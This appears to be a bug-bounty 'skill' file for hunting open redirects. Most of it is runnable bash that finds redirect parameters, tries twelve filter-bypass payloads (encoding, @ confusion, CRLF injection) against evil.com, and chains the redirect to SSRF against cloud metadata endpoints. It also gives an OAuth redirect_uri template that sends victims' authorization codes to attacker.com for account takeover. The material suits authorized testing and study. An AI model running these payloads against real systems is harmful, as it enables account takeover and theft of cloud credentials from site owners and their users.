---
name: k1nzr3c0n-hunt-open-redirect
description: "Open Redirect hunting skill. 12 bypass techniques, OAuth redirect_uri chain test, server-side SSRF escalation. Never-submit standalone — must chain to OAuth token theft, phishing via trusted domain, or SSRF. Integrates with openredirex/nuclei/gf+qsreplace automation."
tags: [open-redirect, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Open Redirect

> **Never submit standalone**: open redirect alone = Low/Informational. Must chain.
> **Chain options**: OAuth redirect_uri → ATO | SSRF escalation | phishing with trusted domain.

---

## Crown Jewels

```
Priority 1 — OAuth redirect_uri bypass → authorization code theft → ATO (see hunt-oauth)
Priority 2 — SSRF via server-side open redirect (redirect to 169.254.169.254)
Priority 3 — Phishing: trusted corporate domain redirect to fake login page
Priority 4 — Cache poisoning chain: open redirect in cached response
Priority 5 — Token leakage: redirect to attacker with token in URL
```

---

## Phase 0 — Discover Candidates

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_redirect_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

RUNS_BASE="/app/runs"
# Parameters commonly used for redirects
grep -rhoP 'https?://[^\s"]+[?&](?:url|redirect|redirect_url|redirect_uri|next|return|return_to|goto|dest|destination|link|redir|ref|referer|continue|back|r|u|target|to|location|out|forward)=[^\s&"]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/redirect_candidates.txt" | wc -l \
  | xargs echo "Redirect candidates:"
head -20 "$HUNT/redirect_candidates.txt" | sed 's/^/  /'
```

## Phase 1 — Basic Detection

```bash
echo "=== Open Redirect Detection ==="

for EP in $(head -30 "$HUNT/redirect_candidates.txt"); do
  BASE=$(echo "$EP" | grep -oP 'https?://[^?]+\?')
  PARAM=$(echo "$EP" | grep -oP '(?<=[?&])[a-zA-Z_-]+(?==)')
  
  RESP=$(curl -sk -I "${BASE}${PARAM}=https://evil.com" 2>/dev/null)
  LOC=$(echo "$RESP" | grep -i '^location:' | tr -d '\r')
  
  echo "$LOC" | grep -qi 'evil.com' && \
    echo "  [OPEN REDIRECT] $EP → $LOC"
done
```

## Phase 2 — 12 Bypass Techniques

```bash
echo "=== Open Redirect Filter Bypasses ==="
TEST_EP="${REDIRECT_ENDPOINT:-https://${TARGET}/redirect?url=}"

BYPASSES=(
  # 1. Protocol variation
  "//evil.com"
  "///evil.com"
  "////evil.com"
  # 2. URL encoding
  "https%3A%2F%2Fevil.com"
  "https%3A//evil.com"
  # 3. @ host confusion
  "https://${TARGET}@evil.com"
  "https://evil.com@${TARGET}"
  # 4. Backslash (Windows IIS)
  "https://evil.com\\"
  "//evil.com\\"
  # 5. Unicode
  "https://еvil.com"  # Cyrillic е
  # 6. Open redirect via path
  "https://${TARGET}/redirect?url=https://evil.com"
  # 7. Hash bypass
  "https://${TARGET}#https://evil.com"
  # 8. Parameter pollution
  "https://${TARGET}&url=https://evil.com"
  # 9. Newline injection
  "https://evil.com%0d%0aLocation: https://real-evil.com"
  # 10. CRLF
  "https://evil%0d%0a.com"
  # 11. Double slash
  "https://evil.com//test"
  # 12. Whitespace
  " https://evil.com"
  "https://evil.com "
)

for BYPASS in "${BYPASSES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$BYPASS")
  RESP=$(curl -sk -I "${TEST_EP}${ENCODED}" 2>/dev/null)
  LOC=$(echo "$RESP" | grep -i '^location:')
  echo "$LOC" | grep -qi 'evil' && echo "  [BYPASS] ${BYPASS:0:40} → $LOC"
done
```

## Phase 3 — Chain: Open Redirect → SSRF

```bash
echo "=== Open Redirect → SSRF Chain ==="
REDIRECT_EP="${REDIRECT_ENDPOINT:-https://${TARGET}/redirect?url=}"

# If server-side follows redirects, open redirect becomes SSRF
METADATA_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://127.0.0.1/"
  "http://localhost/"
)

for META in "${METADATA_TARGETS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$META")
  RESP=$(curl -sk "${REDIRECT_EP}${ENCODED}" 2>/dev/null)
  [ "${#RESP}" -gt 20 ] && \
    echo "  [SSRF-CHAIN] $META → ${RESP:0:100}"
done
```

## Phase 4 — OAuth Chain Template

```bash
echo "=== OAuth Chain: Open Redirect → ATO ==="
echo ""
echo "If open redirect found at: ${REDIRECT_ENDPOINT:-https://${TARGET}/redirect?url=}"
echo ""
echo "OAuth chain steps:"
echo "  1. Find OAuth redirect_uri allows open redirect on same domain"
echo "     e.g.: redirect_uri=https://${TARGET}/redirect?url=https://attacker.com"
echo "  2. Victim authenticates → authorization code sent to attacker.com"
echo "  3. Attacker exchanges code for token → ATO"
echo ""
echo "Test:"
AUTH_EP="${OAUTH_AUTH_EP:-https://${TARGET}/oauth/authorize}"
CLIENT_ID="${OAUTH_CLIENT_ID:-}"
REDIRECT_PATH="${REDIRECT_PATH:-/redirect?url=https://attacker.com}"
echo "  curl -skI '${AUTH_EP}?client_id=${CLIENT_ID}&redirect_uri=https://${TARGET}${REDIRECT_PATH}&response_type=code'"
```

## Phase 5 — Gate 0

```bash
echo "=== Open Redirect Gate 0 ==="
echo "  □ NEVER submit standalone — must chain"
echo "  □ Chain options:"
echo "    - OAuth: redirect_uri accepts open redirect → code stolen → ATO"  
echo "    - SSRF: server follows redirect to internal/metadata"
echo "    - Phishing: document what trusted reputation adds vs. direct evil.com link"
echo "  □ Browser confirms redirect to evil.com (not just Location header)"
echo "  □ If chained to ATO: prove login as victim"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Open Redirect in [?redirect=] chains with OAuth redirect_uri to steal authorization code → ATO
Server-side Open Redirect in [/redirect?url=] fetches user-controlled URLs enabling SSRF to cloud metadata (169.254.169.254)
```
